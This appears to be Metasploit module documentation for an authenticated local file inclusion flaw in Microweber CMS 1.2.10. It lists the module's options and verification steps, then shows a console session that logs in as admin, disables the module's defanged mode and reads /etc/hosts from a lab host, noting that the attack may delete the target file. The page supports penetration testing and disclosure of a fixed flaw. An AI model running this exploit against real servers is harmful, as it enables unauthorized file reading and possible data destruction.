## Vulnerable Applications
Microweber CMS v1.2.10 LFI (Authenticated) has been verified and fixed according to the maintainer of the project. You check out the vulnerability report:
https://huntr.dev/bounties/09218d3f-1f6a-48ae-981c-85e86ad5ed8b/

**The older versions of Microweber CMS might be vulnerable too. I've not tested the module against the other versions.**
If you want, you can follow the steps in the official vulnerability report to reproduce the vulnerability against the older versions. (not guaranteed)

## Verification Steps
- [ ] Start `msfconsole`
- [ ] Run `use auxiliary/gather/microweber_lfi`
- [ ] Set `RHOSTS`
- [ ] Set `USERNAME`
- [ ] Set `PASSWORD`
- [ ] Set `LOCAL_FILE_PATH`
- [ ] Run `exploit`
- [ ] Verify that you see `Checking if it's Microweber CMS.`
- [ ] Verify that you see `Microweber CMS has been detected.`
- [ ] Verify that you see `Checking Microweber's version.`
- [ ] Verify that you see `Microweber version 1.2.10`
- [ ] Verify that you see `The target appears to be vulnerable.`
- [ ] Verify that you see `Trying to log in.`
- [ ] Verify that you see `You are logged in`
- [ ] Verify that you see `Uploading LOCAL_FILE_PATH to the backup folder.`
- [ ] Verify that you see `FILE was moved!`
- [ ] Verify that you see `Downloading FILE from the backup folder.`

## Options
```
msf6 auxiliary(gather/microweber_lfi) > options

Module options (auxiliary/gather/microweber_lfi):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   DEFANGED_MODE    true             yes       Run in defanged mode
   LOCAL_FILE_PATH                   yes       The path of the local file.
   PASSWORD                          yes       The admin's password for Microweber
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                            yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT            80               yes       The target port (TCP)
   SSL              false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI        /                yes       The base path for Microweber
   USERNAME                          yes       The admin's username for Microweber
   VHOST                             no        HTTP server virtual host
```

## Scenerios
This module has been tested against Microweber CMS v1.2.10 installed on Ubuntu.

```
msf6 auxiliary(gather/microweber_lfi) > use auxiliary/gather/microweber_lfi
msf6 auxiliary(gather/microweber_lfi) > set username admin
username => admin
msf6 auxiliary(gather/microweber_lfi) > set password admin
password => admin
msf6 auxiliary(gather/microweber_lfi) > set local_file_path /etc/hosts
local_file_path => /etc/hosts
msf6 auxiliary(gather/microweber_lfi) > set rhosts 192.168.188.132
rhosts => 192.168.188.132
msf6 auxiliary(gather/microweber_lfi) > check

[*] Checking if it's Microweber CMS.
[+] Microweber CMS has been detected.
[*] Checking Microweber's version.
[+] Microweber version 1.2.10
[*] 192.168.188.132:80 - The target appears to be vulnerable.
msf6 auxiliary(gather/microweber_lfi) > exploit
[*] Running module against 192.168.188.132

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if it's Microweber CMS.
[+] Microweber CMS has been detected.
[*] Checking Microweber's version.
[+] Microweber version 1.2.10
[+] The target appears to be vulnerable.
[-] Auxiliary aborted due to failure: bad-config: Triggering this vulnerability may delete the local file if the web service user has the permission.
If you want to continue, disable the DEFANGED_MODE.
=> set DEFANGED_MODE false
msf6 auxiliary(gather/microweber_lfi) > set defanged_mode false
defanged_mode => false
msf6 auxiliary(gather/microweber_lfi) > exploit
[*] Running module against 192.168.188.132

[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking if it's Microweber CMS.
[+] Microweber CMS has been detected.
[*] Checking Microweber's version.
[+] Microweber version 1.2.10
[+] The target appears to be vulnerable.
[*] Trying to log in.
[+] You are logged in
[*] Uploading /etc/hosts to the backup folder.
[+] hosts was moved!
[*] Downloading hosts from the backup folder.
[*] 127.0.0.1 localhost
127.0.1.1 ubuntu-srv-tk

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

[*] Auxiliary module execution completed
```
